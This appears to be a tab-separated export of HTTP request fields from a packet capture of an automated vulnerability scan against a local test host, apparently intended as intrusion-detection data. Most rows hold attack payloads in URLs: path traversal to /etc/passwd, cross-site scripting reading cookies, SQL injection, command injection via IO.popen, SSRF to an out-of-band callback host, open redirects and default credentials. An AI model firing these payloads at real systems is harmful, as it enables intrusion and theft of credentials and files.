http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close		256	256	application/soap;  charset="utf-8"						192.168.1.104															1	http://192.168.1.104/web/_async/AsyncResponseService		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/_async/AsyncResponseService
application/json	gzip																close		307	307	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/global-protect/login.esp?user=j%22;-alert(1)-%22x		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/global-protect/login.esp?user=j%22;-alert(1)-%22x
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/static/../../../a/../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/static/../../../a/../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/dompdf.php?input_file=dompdf.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/dompdf.php?input_file=dompdf.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&
application/json	gzip																close		188	188	multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/Config/SaveUploadedHotspotLogoFile		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/Config/SaveUploadedHotspotLogoFile
*/*	gzip	en															close		596	596	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/login.action		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/login.action
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/getFavicon?host=http://c8accf99m8v8l7afta3gcekccxayyyyyr.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/getFavicon?host=http://c8accf99m8v8l7afta3gcekccxayyyyyr.oast.site
	gzip																close		171	171	application/x-www-form-urlencoded; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/console/images/%252e%252e%252fconsole.portal		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/console/images/%252e%252e%252fconsole.portal
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/sidekiq/queues/%22onmouseover=%22alert%28nuclei%29%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/sidekiq/queues/%22onmouseover=%22alert%28nuclei%29%22
	gzip		admin:pass						Basic YWRtaW46cGFzcw==								close		161	161	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/checkValid		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/checkValid
*/*	gzip																close		93	93							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/system_mgr.cgi?		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cgi-bin/system_mgr.cgi?
application/json	gzip																close		142	142	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/_ignition/execute-solution
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?v=d&p=%22;alert(document.domain);%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/index.php?v=d&p=%22;alert(document.domain);%22
*/*	gzip	en															close		47	47	text/xml						192.168.1.104															1	http://192.168.1.104/web/getcfg.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/getcfg.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=dompdf.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=dompdf.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/find_v2/_click?_t_id=&_t_q=&_t_hit.id=&_t_redirect=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/find_v2/_click?_t_id=&_t_q=&_t_hit.id=&_t_redirect=https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_jejob&view=../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/index.php?option=com_jejob&view=../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
	gzip																close		66	66	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/autodiscover/autodiscover.json
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/about/../tree?action=get		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/about/../tree?action=get
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip																close										192.168.1.104															1	http://192.168.1.104/web/BSW_cxttongr.htm		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/BSW_cxttongr.htm
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close		256	256	application/soap;  charset="utf-8"						192.168.1.104															1	http://192.168.1.104/web/_async/AsyncResponseService		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/_async/AsyncResponseService
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/static/../../../a/../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/static/../../../a/../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/getFavicon?host=http://c8accf99m8v8l7afta3gcekccxayyyyyr.oast.site		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/getFavicon?host=http://c8accf99m8v8l7afta3gcekccxayyyyyr.oast.site
*/*	gzip	en															close		596	596	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/login.action		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/login.action
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&
application/json	gzip																close		188	188	multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/Config/SaveUploadedHotspotLogoFile		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/Config/SaveUploadedHotspotLogoFile
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/login?next=\\\example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/login?next=\\\example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
	gzip																close		171	171	application/x-www-form-urlencoded; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/console/images/%252e%252e%252fconsole.portal		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/console/images/%252e%252e%252fconsole.portal
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/sidekiq/queues/%22onmouseover=%22alert%28nuclei%29%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/sidekiq/queues/%22onmouseover=%22alert%28nuclei%29%22
*/*	gzip																close		93	93							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/system_mgr.cgi?		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cgi-bin/system_mgr.cgi?
	gzip		admin:pass						Basic YWRtaW46cGFzcw==								close		161	161	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/checkValid		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/checkValid
*/*	gzip	en															close		32	32							192.168.1.104															1	http://192.168.1.104/web/homeaction.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/homeaction.php
